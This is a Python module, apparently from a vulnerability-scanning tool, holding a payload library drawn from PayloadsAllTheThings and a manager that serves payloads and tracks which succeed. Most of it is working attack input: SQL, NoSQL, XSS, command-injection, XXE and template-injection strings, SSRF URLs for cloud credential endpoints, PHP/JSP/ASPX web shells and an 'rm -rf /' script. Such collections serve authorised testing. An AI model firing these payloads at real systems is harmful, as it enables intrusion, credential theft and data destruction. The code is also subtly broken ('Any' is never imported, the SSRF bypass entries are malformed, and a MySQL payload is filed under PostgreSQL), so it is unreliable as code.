"""
Payload management for vulnerability validation.
Integrates payloads from PayloadsAllTheThings repository.
"""

from typing import Dict, List, Optional
import logging

logger = logging.getLogger(__name__)


class PayloadLibrary:
    """
    Comprehensive payload library for vulnerability testing.
    Based on PayloadsAllTheThings (https://github.com/swisskyrepo/payloadsallthethings)
    """

    # SQL Injection Payloads
    SQL_INJECTION = {
        "mysql": [
            "' OR '1'='1",
            "1' OR '1'='1",
            "admin' --",
            "admin' #",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "' UNION SELECT NULL --",
            "' UNION SELECT NULL,NULL --",
            "' UNION SELECT user(),database() --",
            "' UNION SELECT @@version --",
            "1' AND SLEEP(5) --",
            "1' AND BENCHMARK(50000000,MD5('test')) --",
        ],
        "postgresql": [
            "' OR '1'='1",
            "1' OR '1'='1",
            "admin' --",
            "' OR 1=1 --",
            "' UNION SELECT NULL --",
            "' UNION SELECT version() --",
            "1' AND (SELECT SLEEP(5)) --",
            "1' AND pg_sleep(5) --",
        ],
        "mssql": [
            "' OR '1'='1",
            "1' OR '1'='1",
            "admin' --",
            "' UNION SELECT NULL --",
            "' UNION SELECT @@version --",
            "1' WAITFOR DELAY '00:00:05' --",
        ],
        "oracle": [
            "' OR '1'='1",
            "1' OR '1'='1",
            "' UNION SELECT NULL FROM dual --",
            "' UNION SELECT banner FROM v$version --",
        ],
        "sqlite": [
            "' OR '1'='1",
            "1' OR '1'='1",
            "' UNION SELECT sqlite_version() --",
        ],
    }

    # NoSQL Injection Payloads
    NOSQL_INJECTION = {
        "mongodb": [
            '{"$ne": null}',
            '{"$ne": ""}',
            '{"$gt": ""}',
            '{"$where": "function(){return true;}"}',
            '{"$regex": ".*"}',
            "'; return true; //",
            "'; return true; var dummy='",
            "db.users.find({\"username\":{\"$ne\":null}})",
            "db.users.find({\"password\":{\"$regex\":\".*\"}})",
        ],
        "couchdb": [
            '{"_id": {"$ne": null}}',
            '{"selector": {"$where": "function(){return true;}"}}',
        ],
    }

    # XSS Payloads
    XSS = {
        "reflected": [
            '<img src=x onerror="alert(1)">',
            '<svg onload="alert(1)">',
            '<body onload="alert(1)">',
            '"><script>alert(1)</script>',
            'javascript:alert(1)',
            '<iframe src="javascript:alert(1)">',
            '<input onfocus="alert(1)" autofocus>',
            '<marquee onstart="alert(1)">',
            '<details open ontoggle="alert(1)">',
            '<img src=x onerror="1+1">',
            '<svg onload="1+1">',
            '<iframe src="javascript:1+1">',
        ],
        "stored": [
            '<img src=x onerror="console.log(\'stored_xss\')">',
            '<svg onload="console.log(\'stored_xss\')">',
            '<script>console.log("stored_xss")</script>',
        ],
        "dom": [
            '<img src=x onerror="console.log(\'DOM_XSS\')">',
            'document.write("<script>alert(1)</script>")',
            'eval("alert(1)")',
            'Function("alert(1)")()',
        ],
        "polyglot": [
            'jaVasCript:/**/alert(1)',
            '&#60;img src=x onerror="alert(1)">',
            '<img src="x" onerror=alert(1)>',
        ],
    }

    # Command Injection Payloads
    COMMAND_INJECTION = {
        "unix_linux": [
            "; whoami",
            "| whoami",
            "|| whoami",
            "& whoami",
            "`whoami`",
            "$(whoami)",
            "; id",
            "| id",
            "; uname -a",
            "| cat /etc/passwd",
            "; ls -la",
            "| pwd",
        ],
        "windows": [
            "& whoami",
            "| whoami",
            "; whoami",
            "`whoami`",
            "$(whoami)",
            "& dir",
            "| ipconfig",
            "& type C:\\windows\\win.ini",
        ],
    }

    # LDAP Injection Payloads
    LDAP_INJECTION = [
        "*",
        "*)(uid=*",
        "admin*",
        "*)(|(uid=*",
        "uid=admin*",
        "uid=*)(|(uid=*",
        "*))(&(uid=*",
    ]

    # Path Traversal Payloads
    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252fetc%252fpasswd",
        "%2e%2e%2fetc%2fpasswd",
        "..%c0%afetc%c0%aapasswd",
        "..%e2%81%a0etc%e2%81%a0passwd",
        "..;/etc/passwd",
        "....%2f....%2fetc%2fpasswd",
    ]

    # XXE Payloads
    XXE_INJECTION = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    ]

    # SSTI Payloads
    SSTI = {
        "jinja2": [
            "{{ 7 * 7 }}",
            "{{ self }}",
            "{{ config }}",
            "{{ ''.__class__.__mro__[1].__subclasses__() }}",
        ],
        "twig": [
            "{{ 7 * 7 }}",
            "{{ _self }}",
            "{{ _context }}",
        ],
        "erb": [
            "<%= 7 * 7 %>",
            "<%= system('whoami') %>",
        ],
        "freemarker": [
            "${ 7 * 7 }",
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}',
        ],
        "velocity": [
            "#set($x=7*7)$x",
        ],
    }

    # SSRF Payloads
    SSRF = {
        "localhost": [
            "http://127.0.0.1:80/",
            "http://localhost:80/",
            "http://0.0.0.0:80/",
            "http://127.0.0.1/admin",
            "http://localhost/admin",
            "http://127.0.0.1:8080",
            "http://127.0.0.1:3000",
        ],
        "cloud_metadata": [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance",
            "http://169.254.169.254/metadata/v1/",
        ],
        "internal_services": [
            "http://127.0.0.1:6379/",  # Redis
            "http://127.0.0.1:27017/",  # MongoDB
            "http://127.0.0.1:3306/",   # MySQL
            "http://127.0.0.1:5432/",   # PostgreSQL
            "http://127.0.0.1:9200/",   # Elasticsearch
        ],
        "bypass": [
            "http://127.0.0.1 → 127.0.0.1",
            "http://127.0.0.1 → 2130706433",
            "http://127.0.0.1 → 0x7f.0x0.0x0.0x1",
            "http://127.0.0.1 → 0177.0.0.01",
        ],
    }

    # Open Redirect Payloads
    OPEN_REDIRECT = [
        "http://attacker.com",
        "https://attacker.com",
        "//attacker.com",
        "///attacker.com",
        "////attacker.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ]

    # File Upload Payloads
    FILE_UPLOAD = {
        "php": [
            "<?php phpinfo(); ?>",
            "<?php system($_GET['cmd']); ?>",
            "<?php eval($_POST['code']); ?>",
        ],
        "jsp": [
            "<%@ page import=\"java.io.*\" %><%String cmd = request.getParameter(\"cmd\");%>",
        ],
        "aspx": [
            "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd\");%>",
        ],
        "executable": [
            "#!/bin/bash\nrm -rf /",
        ],
    }

    # IDOR Payloads
    IDOR = [
        "1", "2", "3", "10", "100", "1000",
        "0", "-1", "-2",
        "admin", "root", "test",
    ]

    # Broken Access Control
    BAC = [
        "/admin",
        "/admin/",
        "/administrator",
        "/moderator",
        "/user/1",
        "/user/admin",
    ]

    # Security Misconfiguration
    SECURITY_MISCONFIGURATION = [
        "/.env",
        "/.git/config",
        "/web.config",
        "/composer.json",
        "/package.json",
        "/.htaccess",
        "/robots.txt",
        "/sitemap.xml",
        "/.well-known/security.txt",
    ]

    # Cryptographic Failures
    CRYPTO_PAYLOADS = [
        "TLS 1.0",
        "TLS 1.1",
        "SSLv3",
        "Weak Ciphers",
        "Self-signed Certificate",
    ]

    @classmethod
    def get_payloads(cls, category: str, subcategory: str = "") -> List[str]:
        """Get payloads for a category"""
        try:
            payloads = getattr(cls, category.upper())

            if isinstance(payloads, dict) and subcategory:
                return payloads.get(subcategory, [])
            elif isinstance(payloads, dict):
                # Return all payloads from all subcategories
                all_payloads = []
                for category_payloads in payloads.values():
                    all_payloads.extend(category_payloads)
                return all_payloads
            else:
                return payloads

        except AttributeError:
            logger.warning(f"Unknown payload category: {category}")
            return []

    @classmethod
    def get_sql_payloads(cls, database: str = "mysql") -> List[str]:
        """Get SQL injection payloads for specific database"""
        return cls.SQL_INJECTION.get(database, cls.SQL_INJECTION["mysql"])

    @classmethod
    def get_xss_payloads(cls, xss_type: str = "reflected") -> List[str]:
        """Get XSS payloads for specific type"""
        return cls.XSS.get(xss_type, cls.XSS["reflected"])

    @classmethod
    def get_all_categories(cls) -> Dict[str, int]:
        """Get all payload categories with counts"""
        return {
            "sql_injection": len(cls.SQL_INJECTION),
            "nosql_injection": len(cls.NOSQL_INJECTION),
            "xss": len(cls.XSS),
            "command_injection": len(cls.COMMAND_INJECTION),
            "ldap_injection": len(cls.LDAP_INJECTION),
            "path_traversal": len(cls.PATH_TRAVERSAL),
            "xxe_injection": len(cls.XXE_INJECTION),
            "ssti": len(cls.SSTI),
            "ssrf": len(cls.SSRF),
            "open_redirect": len(cls.OPEN_REDIRECT),
            "file_upload": len(cls.FILE_UPLOAD),
            "idor": len(cls.IDOR),
            "bac": len(cls.BAC),
            "security_misconfiguration": len(cls.SECURITY_MISCONFIGURATION),
        }


class PayloadManager:
    """Manages payload delivery and rotation"""

    def __init__(self):
        self.library = PayloadLibrary()
        self.executed_payloads = {}

    def get_payloads_for_vulnerability(self, vuln_type: str) -> List[str]:
        """Get payloads for vulnerability type"""
        mapping = {
            "sql_injection": lambda: self.library.get_payloads("SQL_INJECTION"),
            "nosql_injection": lambda: self.library.get_payloads("NOSQL_INJECTION"),
            "xss": lambda: self.library.get_payloads("XSS"),
            "reflected_xss": lambda: self.library.get_xss_payloads("reflected"),
            "stored_xss": lambda: self.library.get_xss_payloads("stored"),
            "dom_xss": lambda: self.library.get_xss_payloads("dom"),
            "command_injection": lambda: self.library.get_payloads("COMMAND_INJECTION"),
            "ldap_injection": lambda: self.library.get_payloads("LDAP_INJECTION"),
            "path_traversal": lambda: self.library.get_payloads("PATH_TRAVERSAL"),
            "xxe": lambda: self.library.get_payloads("XXE_INJECTION"),
            "ssti": lambda: self.library.get_payloads("SSTI"),
            "ssrf": lambda: self.library.get_payloads("SSRF"),
            "open_redirect": lambda: self.library.get_payloads("OPEN_REDIRECT"),
            "file_upload": lambda: self.library.get_payloads("FILE_UPLOAD"),
            "idor": lambda: self.library.get_payloads("IDOR"),
            "bac": lambda: self.library.get_payloads("BAC"),
        }

        return mapping.get(vuln_type, lambda: [])()

    def log_payload_execution(self, vuln_type: str, payload: str, success: bool):
        """Track executed payloads"""
        if vuln_type not in self.executed_payloads:
            self.executed_payloads[vuln_type] = []

        self.executed_payloads[vuln_type].append({
            "payload": payload,
            "success": success,
        })

    def get_execution_stats(self) -> Dict[str, Any]:
        """Get payload execution statistics"""
        stats = {}
        for vuln_type, executions in self.executed_payloads.items():
            successful = sum(1 for e in executions if e["success"])
            stats[vuln_type] = {
                "total": len(executions),
                "successful": successful,
                "success_rate": (successful / len(executions) * 100) if executions else 0,
            }
        return stats
